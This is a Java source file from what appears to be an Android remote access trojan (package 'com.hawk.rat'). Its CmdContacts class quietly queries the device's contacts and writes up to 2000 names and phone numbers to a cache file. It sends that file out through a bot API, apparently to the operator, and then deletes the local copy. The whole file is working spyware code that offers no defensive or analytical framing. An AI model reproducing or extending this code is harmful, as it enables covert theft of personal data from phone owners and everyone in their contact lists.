package com.hawk.rat;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import java.io.File;
import java.io.FileWriter;
public class CmdContacts {
    private final Context ctx;
    public CmdContacts(Context c) { this.ctx = c; }
    public void run() {
        new Thread(() -> {
            try {
                Cursor cur = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
                if (cur == null) { BotApi.sendMessage(ctx, "No contacts"); return; }
                File f = new File(ctx.getCacheDir(), "con_"+System.currentTimeMillis()+".txt"); FileWriter w = new FileWriter(f); int c = 0;
                while (cur.moveToNext() && c < 2000) { w.write(cur.getString(0)+" : "+cur.getString(1)+"\n"); c++; }
                cur.close(); w.close(); BotApi.sendFile(ctx, f, "👥 Contacts"); f.delete();
            } catch (Exception e) { BotApi.sendMessage(ctx, "contacts err: "+e.getMessage()); }
        }).start();
    }
}
